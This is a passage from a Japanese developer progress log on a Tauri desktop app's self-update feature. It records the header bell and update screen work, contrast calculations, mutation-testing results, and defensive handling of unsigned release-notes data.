  衝突するのでモジュール限定属性の設計から入る別タスク。既存の再修正トリガー（「あるいは lint へ移す」）に
  含まれているため追記せず据え置き。
- **`.githooks/pre-commit` の `case` 部分一致**（`Cargo.lock.bak` にも当たる）は偽陽性方向にしか外れず、
  `git diff --cached --name-only` がこの ASCII パスをエスケープすることも無いので厳密化しない。
- **S-3 / S-4 / S-5** は受容または 055c/055d の領分として据え置き（S-4・S-5 は 055c のタスクファイルに記載済み）。

**据え置いた指摘（次のセッションで判断が要るもの）**:

- **コミット分割**（レビュー提案）: 055b と 056a が同一差分に同居している（CLAUDE.md 違反・依頼者の判断で同時実施）。
  提案は **C1: 056a（`.githooks/` + root `package.json` + README + security.md の依存監査 2 ブロック +
  task-board 056 + 本ファイルの追補1・2）→ C2: 055b の実装（`apps/` 配下 + `Cargo.*`）→ C3: 055b の記録
  （security.md の §1/§10/Capabilities + 本ファイルの 055b 節 + タスクファイル 4 本）** の 3 分割。
  C1 を先に置くと **C2 のコミットで hook が自分自身をテストする**（`Cargo.lock` がステージされるため）という利点がある。
  `security.md` と `progress.md` は C1/C3 にまたがるので `git add -p` が要る。**最低でも 056a の分離を推奨**。
- **実機 DevTools 確認は依然として未実施**。レビューでも「**『応答しないネットワークで 15 秒 reject』と
  『publish 後に `pubDate` が `undefined` にならない』の 2 つだけはソースから裏が取れない**」と指摘された。
  この 2 つは省略しないこと。

### 実機 DevTools 確認 ①（publish 前の 404・2026-08-01 実施）

055b タスクファイルのチェックリスト①を依頼者が実施。**期待どおり reject され、想定より多くのことが同時に実測できた。**

**実行**（メイン窓の DevTools コンソール）:

```js
(async () => {
  const t = performance.now();
  try { console.log("resolved:", await window.__TAURI_INTERNALS__.invoke("check_app_update")); }
  catch (e) { console.log("rejected:", e); }
  finally { console.log("elapsed(ms)", Math.round(performance.now() - t)); }
})();
```

⚠ **当初この手順に書いていた `const { invoke } = await import("@tauri-apps/api/core")` は実機で構文エラーになった**
（`SyntaxError: Unexpected keyword 'import'`）。原因は 2 つ: ①DevTools のコンソールは入力を Module ではなく
**Script** として解析するため**トップレベル `await` が構文エラー**になる ②bare specifier の動的 import は
ブラウザ側で解決できない（Vite が事前バンドルしていてもコンソールには import map が無い）。
**`window.__TAURI_INTERNALS__.invoke` は Tauri v2 が全窓に必ず注入する**ので、`withGlobalTauri` 未設定
（＝`window.__TAURI__` が無い）の本アプリでもこれが使える。async IIFE にすると貼り直しでも
`const` 二重宣言にならない。**タスクファイルの 2 箇所を修正済み。**

**結果**:

```
elapsed(ms) 362
rejected: { code: "UPDATE_CHECK_FAILED",
            message: "更新の確認に失敗しました。時間をおいて再度お試しください。",
            details: null, operation: null,
            occurredAt: "2026-08-01T15:31:09.138035+00:00" }
```

**この 1 回で裏が取れたこと（当初は①の 1 項目だけのつもりだった）**:

- **§9 が実物で成立**——`message` は固定文言のみ。`http` / `github` / `latest.json` / `://` のいずれも含まれない。
  `details` / `operation` も `null`＝付帯情報経由の漏洩も無い。`map_err(|_| …)` と引数なしコンストラクタが効いている。
- **404 が `Err` に落ちる**ことの実測裏付け（crate ソース読解の結論と一致）。
  ⚠ ここで `resolved: { available: false }` が出ていたら**オフライン/404 が「最新です」に化ける**重大な仕様違反だった。
  「更新なし」と「確認できなかった」の区別が実物で成立している。
- **`.plugin(tauri_plugin_updater::Builder::new().build())` が実際に効いている**
  （`state::<UpdaterState>()` が panic していない）＝レビュー S-1 のガードが守ろうとしている経路が生きている。
- **リポジトリ初の真の `async fn` コマンドが invoke 経由で往復した**（Future が `Send`・await 跨ぎの非 Send 値なし）。
- **ハングしない**（362ms）。DNS → TLS → 302 → 404 の実通信が往復した時間で、経路自体は正常に出ている。
- `AppError` も省略可フィールドを **`null`** で送る（`details: null` / `operation: null`）＝
  `AppUpdateStatus` と同じ「`skip_serializing_if` を付けない」既存作法がエラー型でも一貫している。**055c は
  `err.details` を truthy 判定で読むこと。**

**残り**: ②到達不可 ③応答しないネットワーク（**15 秒判定＝ソースからは裏が取れない唯一の項目**）
④draft の publish ⑤`available:false` ⑥`available:true` と `pubDate` ⑦version を戻す。

## 2026-08-02 (055c ヘッダーのベル＋バッジ＋アップデート画面 —— **表示まで**／実機確認は依頼者の手番)

> 状態: **実装完了・静的検証すべて緑（500 tests）・実機確認は未実施（依頼者の手番）・未コミット**。
> タスク [docs/tasks/055c-update-notice-and-screen.md](tasks/055c-update-notice-and-screen.md)／親 [055](tasks/055-app-self-update.md)。
> **frontend の表示のみ**。DL/インストール/再起動は 055d、マークダウン描画は 055e。

### やったこと

055b で作った `check_app_update` を**初めて呼ぶ経路**を作った。ヘッダーのベル＋バッジ、アップデート画面、
起動時の自動チェック。**Rust には 1 バイトも触れていない。**

- `src/types.ts`: `Screen` に `"app-update"`。
- `src/App.tsx`: `useAppUpdate()` を `MainWindowApp` で 1 つだけ持ち、`activeNav` 導出条件と画面分岐を追加。
- `src/components/Header.tsx` / `Header.module.css`: ベル（自前インライン SVG）＋ `.bell` ＋ `.navBadge` ＋ `.hasUpdate`。
- 新規 `src/features/app-update/useAppUpdate.ts`（＋テスト）。
- 新規 `src/screens/app-update/`（`UpdateScreen.tsx` / `UpdateScreen.module.css` / `ReleaseNotes.tsx` ＋テスト）。
- 新規 `src/components/Header.test.tsx`（**`src/components/` 初のテスト**。vitest の `include` は
  `src/**/*.test.{ts,tsx}` なので設定変更は不要だった）。

### 依頼者の指示で必ず残す 7 点

**① StrictMode の二重発火をどう防いだか —— ガードを 2 本作って、1 本に畳んだ**

`main.tsx` は `<React.StrictMode>` なので dev では `useEffect(…, [])` が mount → cleanup → mount と 2 回走る。
素直に書くと**起動のたびに `check_app_update` が 2 回発火**し、055b の security-review S-4（ガードもレート制限も無い）が
現実になる。

当初は **`startedRef`（起動時 1 回）＋ `inFlightRef`（実行中は再実行しない）の 2 本**を入れた。
ところが**ミューテーションを回したら `startedRef` を外しても全テストが緑のまま**だった。理由はこう:

- StrictMode の二重 mount は**同一 tick で同期に**起きる。
- `run()` は `inFlightRef.current = true` を **`await` の前**に同期で立てる。
- ＝2 回目の effect が入った時点で必ず `true` なので、**`inFlightRef` だけで StrictMode は止まる**。
- `run` は `useCallback(…, [])` で identity が固定なので、effect が mount 以外で再実行される経路が無い。
  ＝ **`startedRef` を殺せるテストは原理的に書けない**（＝どのミューテーションでも区別できない防御コード）。

progress の 054 節に「**テストがあること自体が誤った安心になる**」と書いた教訓に従い、
**`inFlightRef` 1 本に畳んだ**。畳んだあとは「このガードを外す」変異が
**StrictMode テストと連打テストの 2 本を同時に落とす**（下記ミューテーション表 M1）。

⚠ **再修正トリガー**: `run` の `useCallback` に依存を足すと effect が再実行されうる。
そのときは「完了済みでも再発火しない」ガード（旧 `startedRef` 相当）が別途要る —— コードにも書いた。

⚠ **この不変条件は実機では観測できない**（下記⑦）。担保は完全に vitest 側にある。

**② バッジに採った役割トークンと、ライト/ダーク両方で読める根拠**

**`background: var(--surface)` ＋ `color: var(--text)`。`theme.css` は差分ゼロ**（新トークンを足していない）。

| | ダーク | ライト |
| --- | --- | --- |
| ヘッダー帯 `--primary` | `#2f6bff` | `#0036cb` |
| バッジ地 `--surface` | `#111827` | `#ffffff` |
| **地 vs 帯** | **3.94:1**（非テキスト要素の 3:1 を満たす） | **8.78:1** |
| **文字 `--text` vs 地** | **17.1:1** | **17.7:1** |

`--surface` / `--text` は**パネルで既に対で使われている**組み合わせなので、可読性が構造的に保証される。
両テーマで地の明暗が反転する（ダーク＝暗いチップ／ライト＝白いチップ）が、どちらも帯の青から十分に浮く。

**⚠「赤い通知バッジ」は既存トークンでは作れない**（実測して落とした候補）:

| 候補 | ダーク | ライト |
| --- | --- | --- |
| `--danger` 地 ＋ `--btn-primary-fg` 文字 | 地 vs 帯 **1.63:1** ✗ ／ 文字 **2.66:1** ✗ | 地 vs 帯 **1.82:1** ✗ |
| `--warn` 地 | 地 vs 帯 **2.69:1** ✗ | 4.02:1 ○ |
| `--accent` 地 | 地 vs 帯 **2.49:1** ✗ | **2.89:1** ✗ |
| `--btn-primary-fg` 地 ＋ `--primary` 文字 | 文字 **4.33:1**（小サイズの AA 4.5 に届かない） | 8.78:1 ○ |
| `--text` 地 ＋ `--text-inverse` 文字 | 4.33:1 ○ | 地 vs 帯 **2.02:1** ✗ |

赤にするなら `--badge-bg` / `--badge-fg` の**新トークン 1 対**が要る。054 の「新しい値を発明しない」に反するので、
依頼者の判断で**追加しなかった**（再修正トリガー＝赤が要ると判断されたとき）。

⚠ **途中で 1 つ罠を踏んだ。** `.navBtn` は `opacity: 0.72` を持つ。`opacity` は**子要素へ合成として効き、
子で `opacity: 1` と書いても親より濃くできない**。当初 `.navBadge { opacity: 1 }` と書いていたが**これは無効**で、
実際のバッジ地は帯と合成されて **ダークで 2.86:1** まで落ち、上の 3.94:1 という前提が崩れていた。
`.navBtn.hasUpdate { opacity: 1 }`（**更新があるときだけベル全体を不透明にする**モディファイア）を足して解決した。
＝ **これは意匠ではなくコントラストの要件**である旨を CSS のコメントに残した。

**③ `.navBtn` の position をどう扱ったか**

**`.navBtn` を触らず、ベル専用のモディファイア `.bell { position: relative }` を併記した。**

| 案 | 判定 |
| --- | --- |
| `.navBtn` に直接足す | 共有クラスを 1 ボタンの都合で変える。実害は無いが、**054 で `.toggleLabel` を動かせなかったのと同じ理由**（共有物をローカルな都合で触らない）で採らない |
| ラッパ要素で包む | `nav`（flex・`gap:8px`）にレイアウトボックスが 1 つ増えるだけで得るものが無い |
| **`.bell` モディファイア（採用）** | DOM も `.navBtn` の宣言も増えない。波及は**ベル 1 個だけ** |

**④ `null` 対処とテストで固定した内容**

省略可フィールドは `skip_serializing_if` が無いので **`undefined` ではなく `null` で届く**（055b レビュー Q-4）。
**`!== undefined` を 1 箇所も書かず、すべて truthy 判定**にした。

既存 `appUpdateApi.test.ts` のフィクスチャは**キーごと省略**しているのでこの食い違いを再現できない。
そこで同ファイルと同じ作法（`WireAppUpdateStatus` を宣言して `as unknown as` で流す）を
`UpdateScreen.test.tsx` にも持ち込み、**`null` を明示的に流すケースを 2 本**足した:

1. **更新なし＋全フィールド `null`** → 「最新版です」が出て、画面のどこにも `null` の 4 文字が無い。
2. **更新あり＋`latestVersion`/`notes` が `null`** → 「新しいバージョン」「更新内容」の**行そのものを出さない**・
   `null` を描かない・落ちない。`latest.json` は **minisign 署名の対象外**で壊れた JSON も届きうるので、
   「ありえない組み合わせ」ではなく**防御的に固定した**。

ミューテーション M3/M4（truthy → `!== undefined`）で 2 本とも実際に落ちることを確認済み。

**⑤ `notes` の表示丈の制御（S-5）**

**2 段構え。どちらも `ReleaseNotes.tsx`（＝055e の差し替え点）の中に置いた**ので 055e がそのまま継ぐ。

| 段 | 実体 | 目的 |
| --- | --- | --- |
| 文字数キャップ | `clampNotes()`（20,000 字で打ち切り＋「…（以下省略）」） | **DOM に載る前に**切る。`max-height` だけでは全量が DOM に入り、未署名データで webview を重くできる |
| 高さ上限 | `.notesBody { max-height: 360px; overflow-y: auto }` | 縦に伸び続けて**右下のアップデートボタンを画面外へ押し出す**のを防ぐ（055d で「押せない」に化ける） |

- 行数制限（`-webkit-line-clamp`）は**「内容を読ませる」という本タスクの目的そのものに反する**ので採らない。
- `max-height: 360px` + `overflow-y: auto` は `DiagnosticsScreen.module.css` の `.logList` と**同じ作法・同じ値**
  （＝新しい値の発明ではない）。
- 20,000 字は「`docs/release-notes/vX.Y.Z.md` が数十行である限り絶対に当たらない」量。
  **当たること自体が `latest.json` の異常の合図**である旨をコードに書いた。

**⑥ 055e への差し替え点はどこか**

**`src/screens/app-update/ReleaseNotes.tsx` の 1 ファイルだけ。**

```tsx
export function ReleaseNotes({ notes }: { notes: string }) {
  // 055e: ここを `renderReleaseNotes(clampNotes(notes))` に差し替える。
  return <p className={styles.notesBody}>{clampNotes(notes)}</p>;
}
```

- `UpdateScreen.tsx` 側は `<ReleaseNotes notes={status.notes} />` の 1 行だけ＝**055e で 1 バイトも変わらない**。
- 丈の制御（⑤）も同じファイルにあるので 055e が引き継ぐ。
- CSS は `UpdateScreen.module.css` を共有（同じ画面の一部・モジュールを増やさない）。
- ⚠ **`dangerouslySetInnerHTML` を使わない**。`notes` は `latest.json` 由来で **minisign 署名の対象外**＝
  HTTPS で守られるだけの未署名の外部文字列なので、**テキストノードとしてしか描画しない**。
  ミューテーション M6（`dangerouslySetInnerHTML` に差し替え）でテストが落ちることを確認済み。

**⑦ publish 前後の実機確認 —— 未実施（依頼者の手番）／055b の未了ぶんを兼ねる**

⚠ **まず 1 点訂正**: タスク依頼にあった「**起動時のチェックが 1 回だけであること**」は**実機では観測できない**。
`check_app_update` の HTTP は **Rust プロセス側**で走るので webview の DevTools の Network に 1 本も出ず
（055b の実機確認①でも通信は見えず `invoke` の戻り値だけが見えた）、`available:false` でも reject でも
1 回目と 2 回目の結果が同じなので画面からも区別できない。**担保は vitest の StrictMode テストに置いた。**

**publish 前に確認できること**（エンドポイントは現在 404 ＝ reject 経路のみ）:

1. ベルが出る（ベル → 診断 → 設定 の順・36×36 が崩れない）
2. ベルクリックでアップデート画面へ遷移し、active 表示が付く
3. **「更新を確認できませんでした」**が出る（reject を reject として扱えている）
4. **§9**: 画面にも DevTools コンソールにも生エラー文字列・URL・ローカルパスが出ていない
5. **バッジが出ない**／**アップデートボタンも出ない**（取得失敗状態）
6. ヘッダーのドラッグ移動が従来どおり効く／macOS の信号機回避余白／Windows の自作制御ボタンが崩れない
7. ライト／ダーク両テーマで破綻しない
8. 機内モードで起動しても他機能に影響が無い
9. 「再確認」を連打しても通信が積み上がらない（実行中は同じフックのガードで弾かれる）

**publish 後（依頼者が GitHub Web UI で publish）にしか確認できないこと**:

10. **「最新版です」**（`available:false`）＋バッジが出ない＋ボタンも出ない
11. `tauri.conf.json` の `version` を一時的に下げる（例 `0.1.0` → `0.0.9`）→ `tauri dev` を再起動 →
    **「更新あり」＋バッジ「1」＋現在 `0.0.9` / 新 `0.1.0` ＋更新内容（改行保持）**＋
    **アップデートボタンが出るが `disabled`**
    - ⚠ この間 `pnpm --filter ./apps/desktop test` は `check-version-sync.mjs` で**赤くなる**。
      **戻し忘れの検出装置として正しい挙動**なので、そのまま進めてよい。
    - ⚠ `tauri.conf.json` を触るので Rust の再ビルドが走る。
12. **必ず戻す**: `version` を戻す → `git status --short -- apps/desktop/src-tauri/tauri.conf.json` が空 →
    `pnpm test` が緑に戻ることを確認
13. 「新バージョン: null」のような `null` 由来の表示が出ないこと

**055b の未了項目との対応（＝ 055c が兼ねるぶん）**:

| 055b の残り | 055c で兼ねられるか |
| --- | --- |
| ②到達不可 | ✅ 上記 8（機内モード起動） |
| ④draft の publish | ✅ 上記 10 の前提 |
| ⑤`available:false` | ✅ 上記 10 |
| ⑥`available:true` | ✅ 上記 11 |
| ⑦version を戻す | ✅ 上記 12 |
| ③「繋がるが応答しない」で 15 秒 reject | ❌ **兼ねられない**（`/etc/hosts` ＋ `nc` が要る。055b タスクファイル末尾の手順のまま） |
| ⑥`pubDate` が `undefined` でないこと | ❌ **兼ねられない**（下記のとおり画面に出さない方針。DevTools で `invoke("check_app_update")` を叩いて確認） |

### そのほかの決定

- **`pubDate` は画面に出さない**（依頼者の判断）。理由 3 つ: ①タスクの表示表が「現在バージョン・新バージョン・
  更新内容」の 3 つを正としており**仕様に無い** ②055b レビューが「キー名や型が違うと `as_str()` → `None` で
  **静かに欠落し、テストでは絶対に捕まらない**」と記録している未検証データ ③RFC3339 のままでは読めず、
  `toLocaleString()` で整形すると**ロケール／タイムゾーンという環境情報を画面に出す**方向へ一歩踏み出す（§9 の精神）。
- **`recheck()` は作った。ただし発火点は「取得失敗表示の中の『再確認』ボタン」1 箇所だけ。**
  **ベルは遷移だけ**（毎回通信しない）。**画面を開くたびの自動再チェックもしない。**
  **失敗しても自動リトライしない**（S-4）。
- **`toErrorMessage(e)` を使わなかった。** あれは `AppError.message` を**そのまま**返す実装で、
  §9 の「生エラー文字列を出さない」に対する構造的な保証が無い（今日の Rust 側は固定文言だが、
  素通しは「将来 message に何が入っても出す」形）。フックが持つ**定数** `UPDATE_CHECK_ERROR_MESSAGE` だけを
  `error` に載せ、**例外オブジェクトはフックの外へ一切出さない**（`catch {}` で束縛すらしない＝
  Rust 側の `map_err(|_| …)` と同じ構え）。ミューテーション M3（生 message を載せる）で落ちる。
- **取得失敗に赤帯（`layout.error` の `--danger-soft`）を使わない。** 055b が「ネットワーク断は想定内」
  「静かな表示に落とす」と決めているため、`--muted` の 1 文＋「再確認」ボタンに留めた。
- **タイポグラフィの実値はすべて既存から採り、054 の 13px/700 は持ち込んでいない**（あれはコメビュ窓ローカルの結論）:
  項目名 = `.field label` の **12px/800/`--text`** ／ 値・本文 = `.field input` の **13px/`--text`** ／
  補足 = `DiagnosticsScreen` の `.empty` の **13px/`--muted`**。
  **階層は余白でも作った**（054 の E2E の教訓）: ブロック内 **7px**（`.fieldLabel` の `margin-bottom`）対
  項目間 **14px**（`.fields` の `gap`）＝どちらも `formLayout.module.css` の `.field label` / `.form` の実値。
- **`--text-faint` を 1 箇所も書いていない。** アップデートボタンの無効表示は
  `primitives.module.css` の `.primary:disabled` が既に `color: var(--text-faint)` を持っており、
  **そこで正しく使われている**（054 の「無効状態専用」に合致）＝新しい CSS を書く必要が無かった。
- **`HEADER_SECTIONS` には足していない**（アイコンボタンでありテキストセクション導線ではない）。
  テストでも「単一ソースに `app-update` が無い」「ベルがセクションコンテナの外にある」の両方を固定した。

### 検証（実測）

```bash
pnpm --filter ./apps/desktop typecheck   # 通過
pnpm --filter ./apps/desktop lint        # 通過（警告 0）
pnpm --filter ./apps/desktop test        # 30 files / 500 tests + CSS ガード + バージョン同期ガード すべて緑
                                         # （055b 時点は 465 tests。本タスクで +35）

# ゼロ拡大（すべて差分ゼロを確認）
git status --short -- apps/desktop/src-tauri/ apps/comment-sidecar/ .github/ \
  apps/desktop/package.json pnpm-lock.yaml
git status --short -- apps/desktop/src/screens/comment-viewer/ apps/desktop/src/styles/theme.css \
  apps/desktop/src/screens/formLayout.module.css apps/desktop/src/components/headerSections.ts \
  apps/desktop/scripts/

# 危険な描画・生の色（実コードには 0 件。ヒットするのはコメントとテストのフィクスチャのみ）
grep -rn "dangerouslySetInnerHTML" apps/desktop/src/screens/app-update/ apps/desktop/src/features/app-update/
grep -nE "#[0-9a-fA-F]{3,8}|rgba?\(" apps/desktop/src/screens/app-update/*.css apps/desktop/src/components/Header.module.css
grep -rn "console\." apps/desktop/src/screens/app-update/ apps/desktop/src/features/app-update/
grep -rn "!== undefined" apps/desktop/src/screens/app-update/ apps/desktop/src/features/app-update/
```

**ミューテーション確認 —— 10/10 一致**（元バイト列を退避 → 書換 → 実行 → `trap` で必ず復元）。
テストが「あるだけ」でないことを実証した。

| # | 変異 | 落ちたテスト | 結果 |
| --- | --- | --- | --- |
| M0 | 無変更（負のコントロール） | — | 全 PASS |
| M1 | `inFlightRef` ガードを外す | **StrictMode 二重発火 ＋ 連打（S-4）の 2 本** | 一致 |
| M2 | アップデートボタンの `disabled` を外す | ボタン disabled ＋ null ケースの 2 本 | 一致 |
| M3 | `latestVersion` を `!== undefined` 判定へ | `null` ケース | 一致 |
| M4 | `notes` を `!== undefined` 判定へ | `null` ケース | 一致 |
| M5 | 取得失敗を「最新です」に潰す | 取得失敗の表示 | 一致 |
| M6 | `notes` を `dangerouslySetInnerHTML` で描く | HTML を解釈しない | 一致 |
| M7 | バッジを常に出す | バッジ非表示の 2 本 | 一致 |
| M8 | `aria-label` の件数を落とす | 件数はアクセシブル名側 | 一致 |
| M9 | ベルの遷移先を `diagnostics` に | ベルの遷移 | 一致 |
| — | 復元後 | — | 全 PASS |

⚠ **M1 の初回結果が「全 PASS」だった**ので、そこから①の畳み込みに至った。
ミューテーションを回さなければ「テストが緑だから守られている」と誤認したまま終わっていた。

差分は 4 ファイル（`types.ts` / `App.tsx` / `Header.tsx` / `Header.module.css`）と、
新規 7 ファイル（`features/app-update/useAppUpdate.ts` ＋ テスト、`screens/app-update/` の 4 本、
`components/Header.test.tsx`）。**`src-tauri/` は 1 バイトも変わっていない。**

### 055d へ渡す情報

- **`disabled` を外す場所**: `src/screens/app-update/UpdateScreen.tsx` の
  `<Button variant="primary" disabled>アップデート</Button>`（`layout.bottomActions` の中）。
  直前に「055d ではこの `disabled` を外して `onClick` を配線する」旨のコメントを置いてある。
- **DL/進捗の state を足す場所**: `src/features/app-update/useAppUpdate.ts`。
  `AppUpdatePhase` に `"downloading"` / `"installing"` / `"installed"` を足し、
  進捗率の state と `install()` を `UseAppUpdateResult` に足す想定。**`inFlightRef` と同じ作法で
  多重実行ガードを掛けること**（`install_app_update` にも Rust 側のガードは無い）。
- **`recheck()` の隣に `install()` を置けば `App.tsx` の配線は 1 行増えるだけ**
  （既に `appUpdate` オブジェクトごと `UpdateScreen` へ配っている）。
- ⚠ **`toErrorMessage` を使わないこと**（§9）。定型文言の定数を足す形を踏襲する。
- ⚠ **DL 側は既定で無期限**（055b レビューの訂正）。`configure_client` の
  `connect_timeout` + `read_timeout` で上限を張ること。

### 未完了・次にやること

1. **実機確認**（依頼者）—— publish 前の 9 項目 ⇒ **publish** ⇒ publish 後の 4 項目（上記⑦）。
   ⚠ **項目 5・9 は単体テストで担保済みになったので実機では省いてよい**（取得失敗時にバッジ／
   アップデートボタンを出さないこと＝`Header.test.tsx` と `UpdateScreen.test.tsx`／再確認の連打で
   通信が積み上がらないこと＝`useAppUpdate.test.tsx` の S-4）。項目 6 と 4 も一部を降ろした（上記表）。
   ⚠ **レビュー後の追加 1 項目（申し送り 5 / 055b 未了項目⑥）**: publish 後に DevTools Console で
   `await __TAURI__.core.invoke('check_app_update')` を 1 回だけ叩き、**`pubDate` が文字列で返ること**を
   目視する。`pubDate` は画面に出していないので**壊れても画面からは永久に気づけない**うえ、Rust 側の
   `pub_date_from_raw` は**キー名が変われば静かに `None` へ劣化する**（`commands.rs` に明記）。
   055a の `make-latest-json.mjs` とのキー名一致は、この 1 回の目視でしか検証できない。
   一度確認すれば以降は 055a を変えるまで再確認不要。
   ⚠ **実機確認の重点は CSS 系**（ロジックは jsdom 側で固めてある）。バッジが帯から浮くか
   （**ライト/ダーク両方**。合成バグはダーク限定だったので、ライトだけ見ても意味がない）／
   改行が実際に保持されるか／`.notesBody` の `max-height` が効くか——この 3 つは
   jsdom では原理的に検証できない。
2. ~~**軽レビュー**~~ **完了**（security-review ＋ code-review を本セッションで実施）。
   指摘への対応は下記「レビュー対応」節。
3. **コミットは未実施**（依頼者の明示指示待ち）。

### レビュー対応（2026-08-02・security-review ＋ code-review）

**判定: セキュリティ＝軽微な懸念あり（修正必須なし）／品質＝良好。**
§9 の非漏洩は構造で守られていること、ゼロ拡大 11 パスがすべて実測差分ゼロであること、
`notes` の描画経路が `ReleaseNotes.tsx` 1 箇所であることを確認済み。

**独立検算の結果:**

- **コントラスト（申し送り 4）＝実装者の数値・結論とも正しい。** WCAG 相対輝度で再計算し、
  ダーク 3.94:1 / ライト 8.79:1、合成バグ時 2.87:1 まで一致。「赤いバッジは既存トークンでは作れない」も正しい。
  補足: **`--warn` はライトなら 4.09:1 で 3:1 を満たす**（ダークが 2.69 で落ちる）＝正確には
  「どのステータス色も**両テーマ同時には**成立しない」。**opacity 合成のバグはダーク限定**だった
  （ライトの合成後は 5.22:1）。
- **`startedRef` 畳み込み（申し送り 1）＝判断は許容できるが、根拠は誤り。**
  「殺せるテストが**原理的に**書けない」は事実に反する。React は **19.2.7** で `React.Activity` が
  stable export として使え、`<Activity>` の hide → show で **`checkAppUpdate` が 2 回発火する**ことを
  PoC で実測した（refs は保持され `inFlightRef` は false に戻っているため素通しする）。
  `startedRef` を戻す必要は無いが、**再修正トリガーを 2 つに増やして `useAppUpdate.ts` に明記**した。
- **ミューテーション再現＝報告の M1〜M9 はすべて KILLED を再現。** 加えて **5 種の生存変異を発見**
  （`.navBtn.hasUpdate` の opacity ／ `.notesBody` の max-height ／ clamp の 2 倍緩和 ／
  失敗時の `setStatus(null)` 削除 ／ `checking` から `idle` を落とす）し、**5 種すべてを本対応で潰した**。
  対応の実効性確認として 3 種を追加（clamp の**縮小**方向 ／ `clampNotes` ごと削除 ／
  成功時の `setError(null)` 削除）＝**全 21 変異中 20 killed / 1 survived**。
  唯一の生存は下記「受容した残存リスク」の `.fieldValue` の `overflow-wrap`。

**対応した指摘（コード修正）:**

| 指摘 | 対応 |
| --- | --- |
| S-1: `.navBtn.hasUpdate { opacity: 1 }` と `.notesBody` の `max-height`/`overflow-y` が機械で守られていない（どちらも変異が生存） | `scripts/check-css-guards.mjs` に **(8) 055c 節**を追加。**本チェッカー初のメインウィンドウ側 CSS**（従来は comment-viewer 配下 4 本のみ）。両変異が FAIL することを実測 |
| S-2: `clampNotes` の上限値を 20,000→40,000 に**緩める**変異が生存（テストが「50,000 未満のどこかで切れる」しか見ていなかった） | `UpdateScreen.test.tsx` の S-5 テストで**上限値を上下から挟む**（`>= 20000` かつ `< 20100`）。055e が `clampNotes` ごと消す事故も同時に落とせる |
| Q-1: 失敗時に `setStatus(null)` する仕様が 1 本もテストされていない（削除しても緑だった） | `useAppUpdate.test.tsx` に**往復テストを 2 本**追加（成功→失敗で status を捨てる／失敗→成功で error を消す） |
| S-3: `latestVersion` は長さ無制限なのに `.fieldValue` に折り返しが無い（`notes` にはある）＝防御の薄い方が壊れやすい | `.fieldValue` に `overflow-wrap: anywhere` を追加。文字種は Rust 側の `semver::Version` パースが拘束するので clamp までは掛けない |
| Q-5: `checking` から `idle` を落とす変異が生存（見出しだけ見ていて本文を見ていなかった） | 確認中テストで**本文**もアサート |
| 申し送り 1・3: 再修正トリガーの穴 | `useAppUpdate.ts` の JSDoc を訂正し、トリガーを 2 つに。StrictMode テストが固定しているのは「二重 mount で 1 回」であって「常に 1 回」ではない旨も明記 |
| 申し送り 5: `pubDate` が壊れても永久に気づけない | 上記「未完了」に DevTools 1 回確認を追加 |

**修正せずコメントで残した指摘**（意図・理由・再修正トリガーを該当箇所に併記）:

- **Q-6** `title` と `aria-label` の食い違い／**Q-7** `type="button"` 無し（既存 3 ボタンに合わせた・
  同ファイル内で既に不統一である事実も明記）／**Q-8** className の二重スペース → `Header.tsx`
- **Q-10** 再確認導線が取得失敗時のみ／**Q-11** `available` の `!failed &&` が冗長（純関数としての
  多重防御なので残す）／**S-4** `notes === ""` で行ごと消える → `UpdateScreen.tsx`
- **品質観点 3** `headline()` / `headlineDescription()` を文言テーブルにすべき → 妥当な指摘だが
  「仕様にないリファクタリングをしない」に従い据え置き。**再修正トリガー＝055d が DL 進捗の文言を
  足すとき**（分岐を 3 箇所に増やさない） → `UpdateScreen.tsx`
- **Q-4** 055e が `ReleaseNotes.tsx` を書き直すと `clampNotes` が一緒に消える危険 → テスト側で
  落とせるようにしたうえで、「clamp を外側に残す」形を JSDoc に明記。併せて
  **「差し替えは 1 ファイル」は .tsx の話で、CSS を含めると 2 ファイル**である点も訂正 → `ReleaseNotes.tsx`

**追加テスト（2026-08-02・手動 E2E の一部を単体へ降ろした）: 502 → 511 tests**

実機確認リストのうち **jsdom で機械化できるものを単体テストへ移した**。ミューテーション 6 種すべて KILLED を実測。

| 実機項目 | 降ろした内容 | 置き場所 |
| --- | --- | --- |
| 6（ドラッグ／信号機余白／Windows 制御ボタン） | `data-tauri-drag-region` と `data-os` の**属性が付くこと**／Windows 制御ボタンの**存在・出し分け・呼び出し先**（`minimize`/`toggleMaximize`/`close` の取り違え回帰）／Windows でもベル・診断・設定の遷移が変わらないこと | `Header.test.tsx` |
| 1（ベルが出る・順序） | **ベル → 診断 → 設定 の DOM 順**（nav は flex・order 指定なしなので DOM 順＝表示順） | `Header.test.tsx` |
| 4（DevTools コンソールに漏れない） | 失敗経路で **`console.log/info/warn/error/debug/trace` が 1 度も呼ばれないこと**。`catch` に `console.error(e)` を足す変異を落とせるようになった（従来は grep でしか守られていなかった） | `useAppUpdate.test.tsx` |

⚠ **Windows 制御ボタンは 055c 以前から一度もテストされていなかった**（申し送り 7 の既知の穴）。
ベルを `nav` に足した変更は同じ `nav` の中身を触るため、ここで回帰を張った。

⚠ **降ろせなかったもの＝実機に残る**: 実際にドラッグでウィンドウが動くか／信号機回避の 78px が実際に空くか／
バッジが帯から浮いて見えるか／`white-space: pre-wrap` の実描画／`max-height` のスクロール——
いずれも **jsdom がカスケードとレイアウトを解決しない**ため原理的に不可能。

⚠ **`App.tsx` の配線（`updateAvailable={appUpdate.status?.available === true}` ／ `screen === "app-update"` 分岐）
は単体テストを書いていない。** `App.tsx` は `CommentViewerApp` / `OverlayApp` / `PinnedOverlayApp` を
transitive に import する（WebSocket・localStorage・OBS・TTS の一式）ため、**JSX 3 行の結線を確かめるのに
モック面が過大**と判断した。この結線は実機項目 2・3・5 が押さえる。
**再修正トリガー＝この結線に条件が増えたとき**（例: バッジの出し分けが `available` 以外にも依存し始めたら、
述語を純関数へ切り出して単体で固定する）。

**受容した残存リスク（対応しないと判断）:**

- **`.fieldValue` の `overflow-wrap: anywhere` 自体は CSS ガードに入れていない**（変異が唯一生存する箇所）。
  `.navBtn.hasUpdate` / `.notesBody` の 2 つをガードしたのは、**消えたときの失敗が具体的で重い**
  （コントラスト 3:1 未満／055d のボタンが画面外）ためで、こちらは「壊れた `latest.json` が来たときに
  版が横に突き抜ける」＝発生条件が GitHub 侵害または有効証明書を持つ MITM に限られ、実害も見た目のみ。
  ガードを増やすほどチェッカー自体の保守コストが上がるので線を引いた。
  **再修正トリガー＝実データで版が折り返す長さになったとき、または `.fieldValue` を他画面へ流用するとき。**
- **4 窓すべてから `check_app_update` を呼べる**（055b の限界）。`MainWindowApp` でしかフックを
